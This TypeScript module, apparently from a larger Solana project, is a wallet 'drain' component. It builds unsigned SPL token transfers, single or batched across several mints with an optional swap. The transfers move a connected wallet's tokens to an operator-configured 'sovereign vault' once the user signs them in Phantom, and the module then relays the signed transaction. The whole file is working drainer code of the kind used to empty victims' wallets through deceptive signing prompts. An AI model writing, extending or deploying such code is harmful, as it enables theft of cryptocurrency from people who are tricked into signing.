/**
 * Solana SPL token drain — unsigned transfer for wallet signing + relay broadcast.
 */
import {
  Connection,
  PublicKey,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'

import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import { parseNativeAmount } from './native-coin-drain.js'
import { resolveSolVaultAddress } from './operational-vault.js'
import { broadcastSignedSolNativeTransfer } from './solana-native-drain.js'
import {
  buildBatchSplTransaction,
  type SplBatchTransferLeg,
} from './solana-settlement-enhancements.js'

const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV')

export type SplTransferRequest = {
  from: string
  to: string
  mint: string
  amount: string
  sourceAta: string
  destinationAta: string
  recentBlockhash: string
  unsignedWireBase64: string
  wallet: 'phantom'
}

function deriveAta(owner: PublicKey, mint: PublicKey): PublicKey {
  const [ata] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID,
  )
  return ata
}

function createSplTransferInstruction(
  source: PublicKey,
  destination: PublicKey,
  owner: PublicKey,
  amount: bigint,
): TransactionInstruction {
  const data = Buffer.alloc(9)
  data.writeUInt8(3, 0)
  data.writeBigUInt64LE(amount, 1)
  return new TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data,
  })
}

/**
 * Build unsigned SPL token transfer for Phantom wallet signing.
 */
export async function buildSplTransferTx(params: {
  wallet: string
  to: string
  mint: string
  amount: bigint
  rpcUrl?: string
}): Promise<SplTransferRequest> {
  if (params.amount <= 0n) {
    throw new Error('SPL transfer amount must be greater than zero')
  }

  const rpc = params.rpcUrl?.trim() || resolveInstitutionalSolanaRpcUrl()
  if (!rpc) {
    throw new Error('RPC_SOLANA_PRIVATE / SOLANA_RPC_URL required')
  }

  const owner = new PublicKey(params.wallet)
  const mint = new PublicKey(params.mint)
  const vaultOwner = new PublicKey(params.to)
  const sourceAta = deriveAta(owner, mint)
  const destinationAta = deriveAta(vaultOwner, mint)

  const connection = new Connection(rpc, { commitment: 'confirmed' })
  const { blockhash } = await connection.getLatestBlockhash('finalized')

  const message = new TransactionMessage({
    payerKey: owner,
    recentBlockhash: blockhash,
    instructions: [
      createSplTransferInstruction(sourceAta, destinationAta, owner, params.amount),
    ],
  }).compileToV0Message()

  const unsigned = new VersionedTransaction(message)
  return {
    from: owner.toBase58(),
    to: vaultOwner.toBase58(),
    mint: mint.toBase58(),
    amount: params.amount.toString(),
    sourceAta: sourceAta.toBase58(),
    destinationAta: destinationAta.toBase58(),
    recentBlockhash: blockhash,
    unsignedWireBase64: Buffer.from(unsigned.serialize()).toString('base64'),
    wallet: 'phantom',
  }
}

/** Build SPL drain plan using configured sovereign vault destination. */
export async function buildSplDrainForBatch(params: {
  wallet: string
  mint: string
  amount: bigint
  vault?: string
  rpcUrl?: string
}): Promise<SplTransferRequest | null> {
  if (params.amount <= 0n) return null
  const vault = params.vault ?? resolveSolVaultAddress()
  if (!vault) {
    throw new Error('VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL required for SPL drain')
  }
  return buildSplTransferTx({
    wallet: params.wallet,
    to: vault,
    mint: params.mint,
    amount: params.amount,
    rpcUrl: params.rpcUrl,
  })
}

/** Broadcast wallet-signed SPL transfer (same wire format as SOL native). */
export async function executeSplTokenDrain(params: {
  signedWireBase64: string
  rpcUrl?: string
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  return broadcastSignedSolNativeTransfer({
    signedWireBase64: params.signedWireBase64,
    rpcUrl: params.rpcUrl,
  })
}

export { parseNativeAmount as parseSplAmount, buildBatchSplTransaction, type SplBatchTransferLeg }

/** Build batch SPL drain (multiple mints in one unsigned transaction). */
export async function buildSplBatchDrainForBatch(params: {
  wallet: string
  transfers: SplBatchTransferLeg[]
  vault?: string
  rpcUrl?: string
  includeJupiterSwap?: boolean
}): Promise<{ unsignedWireBase64: string; recentBlockhash: string; mints: string[] } | null> {
  const legs = params.transfers.filter((t) => t.amount > 0n)
  if (legs.length === 0) return null
  const vault = params.vault ?? resolveSolVaultAddress()
  if (!vault) {
    throw new Error('VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL required for SPL batch drain')
  }
  const batch = await buildBatchSplTransaction({
    wallet: params.wallet,
    vault,
    transfers: legs,
    rpcUrl: params.rpcUrl,
    includeJupiterSwap: params.includeJupiterSwap,
  })
  return {
    unsignedWireBase64: batch.unsignedWireBase64,
    recentBlockhash: batch.recentBlockhash,
    mints: batch.mints,
  }
}
